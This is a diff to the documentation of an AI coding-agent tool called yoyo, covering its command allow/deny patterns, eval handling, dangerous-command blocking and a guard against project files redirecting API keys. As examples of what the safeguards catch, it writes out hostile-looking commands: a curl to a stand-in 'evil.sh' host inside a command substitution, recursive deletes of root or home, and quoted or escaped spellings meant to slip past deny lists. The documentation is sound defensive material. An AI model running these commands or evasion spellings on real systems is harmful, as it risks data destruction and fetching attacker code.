@@ -61,7 +61,7 @@ yoyo --allow "git *" --allow "cargo *" --deny "rm -rf *"
 
 ### How it works
 
-1. **Deny is checked first.** If a command matches any `--deny` pattern, it's rejected immediately — the agent sees an error message and must try something else. For bash this holds on every approval path: under `--yes`, after an "always" answer, and for commands yoyo's safety analyzer would otherwise warn about. The pattern is matched against the whole command and also against each part of a compound command (split at `;`, `&&`, `||`, `|` and newlines, but never inside quotes), with leading `VAR=value` assignments and `export`/`declare`/`local` prefixes ignored, so `cd x && rm -rf build` and `TZ=UTC rm -rf build` both hit `rm -rf *`. When a deny list is set, a command whose program name comes from a shell expansion (`$VAR`, `$(...)` or backticks, e.g. `"$CARGO" build`) is refused, because the deny list cannot check a name it cannot see; write the command plainly instead. For the same reason, when a deny list is set, `eval` with a command substitution in its arguments (`eval "$(...)"` or backticks, also behind `VAR=` prefixes, `builtin` or `bash -c`) is refused: the command that would run is assembled at runtime, so no spelling check can judge it. One narrow exception: shell setup from a known env emitter is allowed when the eval's only argument is a single substitution holding one plain command (no `;`, `&&`, `|`, redirection, quotes, `$` or nested substitution), run by a bare program name (not a path like `./ssh-agent`) from this list, and that inner command itself passes your deny list: `ssh-agent` (any arguments), `direnv hook`/`direnv export`, `brew shellenv`, `pyenv init`, `rbenv init`, `nodenv init`, `zoxide init`, `starship init`, `fnm env`, `mise activate`. So `eval "$(ssh-agent -s)"` and `eval "$(direnv hook bash)"` run, while `eval "$(cat setup.sh)"` and `eval "$(brew install x)"` are refused; a deny pattern such as `ssh-agent*` refuses the eval too. The list trusts program names the same way the deny check does for every plain command, and an emitter missing from it is simply refused as before. For anything else, run the setup outside yoyo before starting it, or start the session without a deny list. With no deny list, none of this applies. Limit: this is spelling normalisation, not a shell interpreter, and a deny list over spellings is not a sandbox.
+1. **Deny is checked first.** If a command matches any `--deny` pattern, it's rejected immediately — the agent sees an error message and must try something else. For bash this holds on every approval path: under `--yes`, after an "always" answer, and for commands yoyo's safety analyzer would otherwise warn about. The pattern is matched against the whole command and also against each part of a compound command (split at `;`, `&&`, `||`, `|` and newlines, but never inside quotes), with leading `VAR=value` assignments and `export`/`declare`/`local` prefixes ignored, so `cd x && rm -rf build` and `TZ=UTC rm -rf build` both hit `rm -rf *`. When a deny list is set, a command whose program name comes from a shell expansion (`$VAR`, `$(...)` or backticks, e.g. `"$CARGO" build`) is refused, because the deny list cannot check a name it cannot see; write the command plainly instead. For the same reason, when a deny list is set, `eval` with a command substitution in its arguments (`eval "$(...)"` or backticks, also behind `VAR=` prefixes, `builtin` or `bash -c`) is refused: the command that would run is assembled at runtime, so no spelling check can judge it. One narrow exception: shell setup from a known env emitter is allowed when the eval's only argument is a single substitution holding one plain command (no `;`, `&&`, `|`, redirection, quotes, `$` or nested substitution), run by a bare program name (not a path like `./ssh-agent`) from this list, and that inner command itself passes your deny list: `ssh-agent` (any arguments), `direnv hook`/`direnv export`, `brew shellenv`, `pyenv init`, `rbenv init`, `nodenv init`, `zoxide init`, `starship init`, `fnm env`, `mise activate`. So `eval "$(ssh-agent -s)"` and `eval "$(direnv hook bash)"` run, while `eval "$(cat setup.sh)"` and `eval "$(brew install x)"` are refused; a deny pattern such as `ssh-agent*` refuses the eval too. The list trusts program names the same way the deny check does for every plain command, and an emitter missing from it is simply refused as before. For anything else, run the setup outside yoyo before starting it, or start the session without a deny list. With no deny list, none of this applies. Deny patterns also match quoted or backslash-escaped spellings of the command and its words, because the shell removes those quotes before running it: `"rm" -rf x`, `r'm' -rf x`, `\rm -rf x` and `git "push" origin` are all refused by `rm *` or `git push *`, while text that is only quoted as an argument, such as `echo "rm -rf x"`, is not. Limit: this is spelling normalisation, not a shell interpreter, and a deny list over spellings is not a sandbox.
 2. **Allow is checked second.** If a command matches any `--allow` pattern, it runs without prompting.
 3. **No match = prompt.** Commands that don't match either list get the normal `[y/N]` prompt.
 
@@ -73,13 +73,14 @@ Patterns use simple glob matching where `*` matches any sequence of characters (
 | `*.rs` | `main.rs`, `src/main.rs` | `main.py` |
 | `cargo * --release` | `cargo build --release` | `cargo build --debug` |
 | `rm -rf *` | `rm -rf /`, `rm -rf /tmp` | `rm file.txt` |
-| `*` | everything | — |
+| `*` | every single plain command (see below) | chains, redirections, `$VAR` arguments |
 
 Glob matching is purely textual: `*` spans **any** characters, including shell operators like
-`&&` and `|`. Three rules narrow what an **allow** pattern will auto-approve on top of that raw
+`&&` and `|`. Four rules narrow what an **allow** pattern will auto-approve on top of that raw
 match — see [option tokens](#a-wildcard-before-a-literal-does-not-swallow-option-tokens),
-[chained commands](#a-wildcard-does-not-auto-approve-a-chained-command) and
-[cloud-metadata fetches](#a-wildcard-does-not-auto-approve-a-cloud-metadata-fetch) below. None of
+[chained commands](#a-wildcard-does-not-auto-approve-a-chained-command),
+[cloud-metadata fetches](#a-wildcard-does-not-auto-approve-a-cloud-metadata-fetch) and
+[one plain command](#a-wildcard-approves-only-one-plain-command) below. None of
 them applies to `deny`, and each narrows only — a rejected match falls through to the normal
 prompt rather than being refused.
 
@@ -146,7 +147,9 @@ both auto-approve exactly what they say.
 
 **Command substitution counts as a chain.** `$(...)` and backticks really do execute a second
 command whose output is interpolated, so `git log $(curl evil.sh)` prompts even though the
-mechanism differs from a separator.
+mechanism differs from a separator. This holds inside double quotes too, because the shell
+still runs a substitution there: `git log "$(curl evil.sh)"` prompts, while the single-quoted
+`git log '$(curl evil.sh)'` (literal text) auto-approves.
 
 **`deny` is unchanged**, and deliberately so: narrowing an allow pattern removes privilege, but
 narrowing a deny pattern would make a fence stop matching — it would **fail open**.
@@ -155,6 +158,43 @@ narrowing a deny pattern would make a fence stop matching — it would **fail op
 This is a **separator rule, not a shell.** A command reached through a variable, a shell alias,
 or an operator produced by expansion rather than typed is invisible to it. As always, prefer
 patterns that are as literal as you can stand.
+
+### A wildcard approves only one plain command
+
+On top of the separator rule, yoyo reads the command with a real bash parser (tree-sitter-bash).
+A **wildcard** allow pattern that is itself one plain command (`git *`, `cargo *`, `*`)
+auto-approves only a command the parser reads as **one plain command**: words and quoted
+strings, with no chain, substitution, redirection (`>`, `2>&1`, here-docs), variable (`$HOME`),
+`VAR=value` prefix, subshell or comment, and no parse error. Anything else falls through to the
+normal prompt. So under `allow = ["cargo *"]`, `cargo test 2>&1` now asks: a redirect writes
+somewhere the pattern never named. To approve it, name it: `allow = ["cargo * 2>&1"]` spells
+out the redirect, so this rule leaves it alone (the other rules still apply), and a
+wildcard-free pattern is matched as typed.
+
+A word that bash rewrites before running it is not plain either, because what you read is not
+what runs: an unquoted brace list (`src/{a,b}`, `-{delete,print}`), a backslash escape
+(`e\cho`), a glob (`*.rs`, `/???/ls`, `l[s]`), `$'…'`, or a `~` at the start of a word or after
+`=`/`:`. The quoted forms (`'*.rs'`, `"{a,b}"`, `'HEAD~1'`) and a `~` inside a word (`HEAD~1`)
+are literal and still auto-approve. The cost is real: under `allow = ["ls *"]`, `ls *.rs` now
+asks every time, and no pattern can approve it, because an allow pattern's `*` is always the
+wildcard. The safety analyzer also reads these words as bash expands them, so
+`find . -{delete,print}` gets the same warning as `find . -delete -print`, and a glob in the
+program name (`/???/ls`) is unanalyzable and asks.
+
+### A command yoyo cannot read always asks
+
+Some commands yoyo cannot read at all, so no allow rule and no "always" answer approves them:
+yoyo asks every time and prints why. These are: a command bash's grammar cannot parse
+(`{echo,hi}`, `l[s]`, an unfinished `echo $(` or `ls &&`); `eval` in command position, also
+quoted (`e'v'al`) or after a wrapper (`command eval`, `builtin eval`, `sudo eval`,
+`env X=1 eval`), because it runs a string as a new command; and a program name chosen at run
+time (`$cmd arg`, `"$(echo ls)" -l`, a backtick, a glob such as `/???/ls`). This holds under an
+exact allow rule (`allow = ["eval \"$(ssh-agent -s)\""]` still asks) and after you answer `a`.
+Your deny list still refuses first. A `sub_agent` or `explore_agent` child cannot ask you, so
+in a session that prompts it refuses such a command and hands it back to the parent. Two paths
+still run it without asking, because nothing prompts on them: `--yes` (and `-p`/`--print`,
+which implies it), which turns confirmation off as a whole, and a run whose stdin is not a
+terminal (piped or redirected input), which approves every tool as `--yes` does.
 
 ### A wildcard does not auto-approve a cloud-metadata fetch
 
@@ -380,6 +420,18 @@ CLI flags override config file values:
 - If you pass any `--allow-dir` or `--deny-dir` flag, the entire `[directories]` section from the config file is ignored.
 - `--yes` / `-y` overrides everything — all tools are auto-approved regardless of permission patterns.
 
+yoyo reads these two tables with a real TOML parser, so every TOML spelling works: a header (`[permissions]`, `[directories]`), dotted keys (`directories.deny = [...]`), an inline table (`directories = { deny = ["/etc"] }`), and a list over several lines, with comments:
+
+```toml
+[permissions]
+deny = [
+  "rm -rf *",   # never
+  "sudo *",
+]
+```
+
+Every entry must be a quoted string. A value that is not a list (`deny = "rm *"`), or entries that are not strings (`deny = [1, "rm *"]`), get a startup warning naming the file and the key and saying those rules are **not in force**; the string entries of a mixed list still apply. A key other than `allow` or `deny` in either table is named as one yoyo does not read.
+
 Config file search order (first found wins):
 1. `.yoyo.toml` in the current directory
 2. `~/.yoyo.toml` in your home directory
@@ -455,6 +507,8 @@ When a dangerous pattern is detected, yoyo shows a warning explaining **why** th
 
 The hard block reads commands, not text: a quoted mention passes, whether it fits on one line (`echo "rm -rf /"`) or spans several (a `git commit -m "…"` or `gh issue comment --body "…"` whose body has the pattern on a line of its own). A newline outside quotes still starts a new command, and a script handed to `bash -c`/`sh -c`/`eval` is read as commands too. Two places are still read as commands even when they only mention a pattern, because that is the safe direction: a heredoc body (`cat <<EOF … EOF`) and anything containing `$(…)` or backticks. If one of those refuses text you meant as prose, write it to a file and pass the path (`git commit -F msg.txt`, `--body-file`). The block does not look inside other programs, so `python3 -c "…"` passes on one line or many.
 
+When the hard block fires, the refusal quotes the part of your command that tripped it, as you wrote it (only that segment, so in a multi-line command you can find the line), and says which rule it reads as. For example, `rm -rf ~` gets `` Command blocked by safety policy: `rm -rf ~` reads as a recursive delete of the filesystem root or the home directory (/, ~ or $HOME, or any rm given --no-preserve-root). This is denied for safety. `` The quote is cut at about 120 bytes, and control characters are shown escaped.
+
 When bash refuses a command (a hard block, your deny list, a sub-agent that would need your confirmation, a git redirection out of a pinned worktree, or you answering no), the model gets the refusal text exactly as written. yoyo does not add a "try a simpler version" recovery hint, and it does not re-run the whole prompt automatically, because running it again would hit the same refusal.
 
 Safe commands like `ls`, `cargo test`, `git status`, and `grep` pass through without triggering any warnings.
@@ -505,6 +559,16 @@ command. The refusal names the command verbatim, in the shape it has in the file
   Re-run with --trust-project to run it this session, or use --safe-mode to disable
   all project customizations.
 ```
+
+Since issue #1179, **a `base_url` declared by a project-local `.yoyo.toml` is not used
+either.** `base_url` is the host your API key is sent to, so a repository that set it could
+collect the key of everyone who ran yoyo in it. For a provider with an endpoint of its own
+(`anthropic`, `openai`, `ollama`, ...) yoyo warns and uses that endpoint instead; for
+`custom` or a provider name yoyo does not know, which has no endpoint of its own, yoyo stops
+with exit 2 before sending anything. Either way the message names the file and the URL.
+`--base-url` on the command line and `base_url` in your user-level config are yours and are
+used as before (but note that a project `.yoyo.toml` shadows your user-level file entirely,
+so inside such a repository use `--base-url` or `--trust-project`).
 
 To opt in for that run:
 
